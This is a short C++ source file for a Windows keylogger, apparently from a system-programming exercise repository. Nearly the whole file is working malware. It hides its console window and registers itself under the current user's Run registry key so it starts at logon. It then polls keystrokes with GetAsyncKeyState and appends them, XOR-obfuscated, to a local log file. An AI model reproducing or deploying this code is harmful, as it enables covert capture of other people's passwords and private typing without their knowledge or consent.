#include <Windows.h>
#include <iostream>
#include <string>

// Keep persistent
void keepPersistent() {
    HKEY hKey;
    RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    RegSetValueEx(hKey, 
                "Keylogger", 
                0, 
                REG_SZ, 
                (BYTE*) "D:\\VCS\\System Programming\\system-programming\\Windows\\Keylogger\\main.exe", 
                sizeof("D:\\VCS\\System Programming\\system-programming\\Windows\\Keylogger\\main.exe"));

    RegCloseKey(hKey);
}

int main() {
    FILE *file;
    std::string xor_key = "key";

    ShowWindow(GetConsoleWindow(), SW_HIDE); 
    keepPersistent();    

    while (true) {
        // Sleep(10);
        for (int i = 8; i < 190; i++) {
            if (GetAsyncKeyState(i) == -32767) {                
                fopen_s(&file, "D:\\VCS\\System Programming\\system-programming\\Windows\\Keylogger\\log.txt", "a+");
                if (file != NULL) {
                    // Xor
                    for (char c: xor_key) {
                        fputc(c ^ i, file);
                    }                                        
                }
            }
        }
    }
}